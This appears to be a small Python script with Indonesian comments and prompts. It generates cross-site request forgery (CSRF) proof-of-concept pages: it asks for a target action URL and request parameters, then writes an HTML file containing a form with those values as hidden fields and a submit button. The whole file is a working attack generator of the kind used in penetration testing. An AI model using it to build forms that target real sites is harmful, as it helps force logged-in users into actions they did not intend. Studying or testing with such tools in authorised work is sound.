#!/usr/bin/python3.5

import os

from random import randrange
from urllib.parse import parse_qs




def csrf_basic(action_url,req_body):

    '''fungsi untuk membuat template CSRF
       @param action_url dan req body ( req parameter )
       
       @return string template html
    '''
    

    data = parse_qs(req_body) #parsing data parameter ke dalam dictionary
    
    params =  [ var for var in data]
    template = "<form method='POST' action='%s'>\n" %(action_url)
    for param in params:
        template += "<input type='hidden' name='%s' value='%s'>\n" %(param,data[param][0])

    template +="<input type='submit' name='Jancok' value='Run Run To You'>\n</form>"

    return template 

def main():
    '''fungsi main'''
    
    filename    = input('[OPSIONAL] Masukan nama dan lokasi file html akan disimpan : ')
    action_url  = input('[*] masukan action URL : ')
    data_param  = input('[*] masukan data parameter (ex.forever=selamanya&love=cinta) : ')

    if not action_url or not data_param:
        print('yang bertanda (*) harus disi!!"')
    else :
        if filename == '':
            filename = os.getcwd() +'/csrf'+str(randrange(0,100))+'.html'

        try :
            f = open(filename, 'w+')
            f.write(csrf_basic(action_url, data_param))
            print('lokasi file :%s' %filename)
            f.close()
        except PermissionError:
            print('Program tidak memiliki hak akses.. menggunakan lokasi sekarang')

if __name__ == '__main__':
    main()
